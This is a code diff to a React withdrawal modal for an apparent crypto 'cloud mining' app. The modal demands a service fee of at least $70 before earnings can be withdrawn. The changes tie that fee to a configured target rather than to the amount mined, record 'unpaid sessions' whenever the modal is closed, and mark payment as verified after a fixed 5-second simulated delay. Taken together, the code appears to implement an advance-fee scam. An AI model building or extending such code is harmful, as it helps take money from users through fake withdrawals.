@@ -2,13 +2,14 @@
 
 import React, { useState, useEffect, useRef, useCallback } from "react";
 import { useMiningStore } from "../store/useMiningStore";
+import { MINING_MODES } from "../config/mining";
 import Portal from "./Portal";
 
 // Static config constants self-contained within the isolated modal component
 const COINS = [
-  { id: 'btc', name: 'Bitcoin', ticker: 'BTC', price: '$77,958', change: '+1.6%', up: true },
-  { id: 'eth', name: 'Ethereum', ticker: 'ETH', price: '$2,143', change: '+1.4%', up: true },
-  { id: 'bnb', name: 'BNB', ticker: 'BNB', price: '$653.79', change: '+2.2%', up: true },
+  { id: 'btc', name: 'Bitcoin', ticker: 'BTC', price: '$77,958', change: '+1.6%', up: true, icon: '/assets/bitcoin.svg' },
+  { id: 'eth', name: 'Ethereum', ticker: 'ETH', price: '$2,143', change: '+1.4%', up: true, icon: '/assets/ethereum.svg' },
+  { id: 'bnb', name: 'BNB', ticker: 'BNB', price: '$653.79', change: '+2.2%', up: true, icon: '/assets/bnb.jpeg' },
   { id: 'sol', name: 'Solana', ticker: 'SOL', price: '$86.96', change: '+3.2%', up: true },
   { id: 'ton', name: 'Toncoin', ticker: 'TON', price: '$2.06', change: '+5.9%', up: true },
   { id: 'xmr', name: 'Monero', ticker: 'XMR', price: '$403.86', change: '+2.4%', up: true },
@@ -52,6 +53,8 @@ export default function WithdrawalModal() {
   const isOpen = useMiningStore((s) => s.isWithdrawalModalOpen);
   const session = useMiningStore((s) => s.withdrawalSession);
   const close = useMiningStore((s) => s.closeWithdrawalModal);
+  const addUnpaidSession = useMiningStore((s) => s.addUnpaidSession);
+  const removeUnpaidSession = useMiningStore((s) => s.removeUnpaidSession);
 
   // Local Modal States
   const [modalStep, setModalStep] = useState(1);
@@ -141,6 +144,9 @@ export default function WithdrawalModal() {
       if (!isOpen) return;
 
       if (e.key === "Escape") {
+        if (session && paymentStatus !== "success") {
+          addUnpaidSession(session);
+        }
         close();
         return;
       }
@@ -175,8 +181,10 @@ export default function WithdrawalModal() {
   // --- ACTIONS & CALCULATIONS ---
   const getPayAmount = useCallback(() => {
     if (!session) return "0.000000";
+    const modeKey = ['standard', 'boosted', 'turbo', 'max'][session.speedTier] || 'standard';
+    const targetUsd = MINING_MODES[modeKey].targetUsd;
     const feePercent = [8, 9, 10, 11][session.speedTier];
-    const rawFee = session.minedUsd * (feePercent / 100);
+    const rawFee = targetUsd * (feePercent / 100);
     const feeUsd = Math.max(70.00, rawFee);
     
     const payCoin = COINS.find(c => c.id === selectedPayCoin);
@@ -243,13 +251,26 @@ export default function WithdrawalModal() {
     setTimeout(() => {
       clearInterval(dotsInterval);
       setPaymentStatus("success");
+      if (session) {
+        removeUnpaidSession(session.sessionId);
+      }
     }, 5000); // Smooth 5-second simulated verification loop
   }, []);
 
   const handleBackdropClick = (e: React.MouseEvent) => {
     if (e.target === e.currentTarget) {
+      if (session && paymentStatus !== "success") {
+        addUnpaidSession(session);
+      }
       close();
     }
+  };
+
+  const handleClose = () => {
+    if (session && paymentStatus !== "success") {
+      addUnpaidSession(session);
+    }
+    close();
   };
 
   // Exit cleanly if unmounted or details missing
@@ -278,7 +299,7 @@ export default function WithdrawalModal() {
           }}
         >
           <div className="modal-handle"></div>
-          <div className="modal-close" onClick={close} aria-label="Close modal">×</div>
+          <div className="modal-close" onClick={handleClose} aria-label="Close modal">×</div>
           <h2>Withdraw Earnings</h2>
           
           <div className="modal-session-code" id="modalSessionCode" style={{ display: 'inline-block' }}>
@@ -308,7 +329,7 @@ export default function WithdrawalModal() {
                 className="btn btn-primary btn-success-close" 
                 onClick={() => {
                   setPaymentStatus("idle");
-                  close();
+                  handleClose();
                 }}
               >
                 Back to Dashboard
@@ -399,13 +420,18 @@ export default function WithdrawalModal() {
                     <div className="fee-row">
                       <span>Service Fee</span>
                       <span id="feeFeeAmt">
-                        ${Math.max(70.00, session.minedUsd * ([8, 9, 10, 11][session.speedTier] / 100)).toFixed(2)} ({[8, 9, 10, 11][session.speedTier]}%)
+                        ${(() => {
+                          const modeKey = ['standard', 'boosted', 'turbo', 'max'][session.speedTier] || 'standard';
+                          const targetUsd = MINING_MODES[modeKey].targetUsd;
+                          const feePercent = [8, 9, 10, 11][session.speedTier];
+                          return Math.max(70.00, targetUsd * (feePercent / 100)).toFixed(2);
+                        })()} ({[8, 9, 10, 11][session.speedTier]}%)
                       </span>
                     </div>
                   </div>
                   <button
-                    className="btn btn-primary"
-                    style={{ width: '100%', marginTop: '8px' }}
+                    className="btn"
+                    style={{ width: '100%', marginTop: '8px', background: 'var(--orange)', color: '#000', border: 'none', fontWeight: '600' }}
                     id="confirmWalletBtn"
                     onClick={confirmWallet}
                   >
@@ -435,7 +461,12 @@ export default function WithdrawalModal() {
                     <div className="fee-row total">
                       <span>Fee to Pay</span>
                       <span id="feeTotalAmt">
-                        ${Math.max(70.00, session.minedUsd * ([8, 9, 10, 11][session.speedTier] / 100)).toFixed(2)}
+                        ${(() => {
+                          const modeKey = ['standard', 'boosted', 'turbo', 'max'][session.speedTier] || 'standard';
+                          const targetUsd = MINING_MODES[modeKey].targetUsd;
+                          const feePercent = [8, 9, 10, 11][session.speedTier];
+                          return Math.max(70.00, targetUsd * (feePercent / 100)).toFixed(2);
+                        })()}
                       </span>
                     </div>
                   </div>
@@ -476,7 +507,7 @@ export default function WithdrawalModal() {
                             onClick={() => setSelectedPayCoin(coin.id)}
                           >
                             <img
-                              src={`/assets/icons/${coin.id}.svg`}
+                              src={coin.icon || `/assets/icons/${coin.id}.svg`}
                               alt={coin.ticker}
                               className="pay-coin-icon"
                               onError={(e) => {
